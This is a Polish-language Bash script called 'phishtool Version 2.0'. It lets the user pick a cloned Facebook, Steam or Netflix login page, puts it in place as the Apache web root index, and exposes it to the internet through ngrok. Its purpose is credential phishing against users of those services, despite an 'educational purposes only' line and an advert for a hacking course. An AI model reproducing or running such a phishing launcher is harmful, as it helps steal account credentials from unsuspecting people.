#!/bin/bash
sudo service apache2 start

facebook_login_page()
{
	echo "wybrales fb";
	sudo rm /var/www/html/index.html
	sudo cp facebook/index.html /var/www/html/index.html
	./ngrok http 80
	sudo rm /var/www/html/index.html
}

stream_login_page()
{
	echo "wybrales Steama";
	sudo rm /var/www/html/index.html
	sudo cp steam/index.html /var/www/html/index.html
	./ngrok http 80
	sudo rm /var/www/html/index.html
}
netflix_login_page()
{
	echo "wybrales Netflixa";
	sudo rm /var/www/html/index.html
	sudo cp netflix/index.html /var/www/html/index.html
	./ngrok http 80
	sudo rm /var/www/html/index.html
}



exit_work()
{
	exit
}



echo "Narzędzie powstało tylko do celów edukacyjnych! --> phishtool Version 2.0"
sleep 2
echo "kup kurs na www.ehaker.pl"
sleep 2
echo "Wybierz opcje"
echo "================="
echo "[1] --->Facebook"
echo "[2] --->Steam"
echo "[3] --->Netflix"
echo "[11] --->EXIT"
echo "================="


read opcja
 

case "$opcja" in


  "1") facebook_login_page ;;
  "2") stream_login_page ;;
  "3") netflix_login_page ;;
  "11") exit_work ;;
  *)  ./run2.sh
  
esac

echo " Narzędzie zakończyło pracę "
sudo service apache2 stop
sleep 2
exit

